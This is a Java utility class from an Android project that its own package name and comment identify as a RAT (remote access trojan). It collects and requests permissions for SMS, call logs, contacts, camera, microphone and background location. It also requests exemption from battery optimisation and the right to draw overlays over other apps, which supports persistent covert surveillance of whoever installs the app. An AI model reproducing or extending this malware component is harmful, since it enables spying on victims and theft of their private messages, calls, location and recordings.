package com.fly0rakoon.rat.utils;

import android.os.PowerManager;
import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class PermissionHelper {
    
    // All required permissions for the RAT
    public static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.PROCESS_OUTGOING_CALLS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.POST_NOTIFICATIONS
    };
    
    // Permissions that need special handling for Android 10+
    public static final String[] ANDROID_10_PERMISSIONS = {
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.ACCESS_MEDIA_LOCATION
    };
    
    // Check if all permissions are granted
    public static boolean hasAllPermissions(Context context) {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        
        // Check Android 10+ specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            for (String permission : ANDROID_10_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(context, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        
        return true;
    }
    
    // Get list of permissions that are not granted
    public static String[] getMissingPermissions(Context context) {
        List<String> missingPermissions = new ArrayList<>();
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
            }
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            for (String permission : ANDROID_10_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(context, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    missingPermissions.add(permission);
                }
            }
        }
        
        return missingPermissions.toArray(new String[0]);
    }
    
    // Request all missing permissions
    public static void requestAllPermissions(Activity activity, int requestCode) {
        String[] missingPermissions = getMissingPermissions(activity);
        if (missingPermissions.length > 0) {
            ActivityCompat.requestPermissions(activity, missingPermissions, requestCode);
        }
    }
    
    // Check if we should show rationale for any permission
    public static boolean shouldShowRationale(Activity activity) {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)) {
                return true;
            }
        }
        return false;
    }
    
    // Open app settings
    public static void openAppSettings(Context context) {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.parse("package:" + context.getPackageName()));
        context.startActivity(intent);
    }
    
    // Check if battery optimization is ignored
    public static boolean isIgnoringBatteryOptimizations(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String packageName = context.getPackageName();
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            return pm.isIgnoringBatteryOptimizations(packageName);
        }
        return true;
    }
    
    // Request ignore battery optimization
    public static void requestIgnoreBatteryOptimizations(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + activity.getPackageName()));
            activity.startActivityForResult(intent, Constants.IGNORE_BATTERY_CODE);
        }
    }
    
    // Check if overlay permission is granted
    public static boolean canDrawOverlays(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(context);
        }
        return true;
    }
    
    // Request overlay permission
    public static void requestOverlayPermission(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + activity.getPackageName()));
            activity.startActivityForResult(intent, Constants.OVERLAY_PERMISSION_CODE);
        }
    }
}
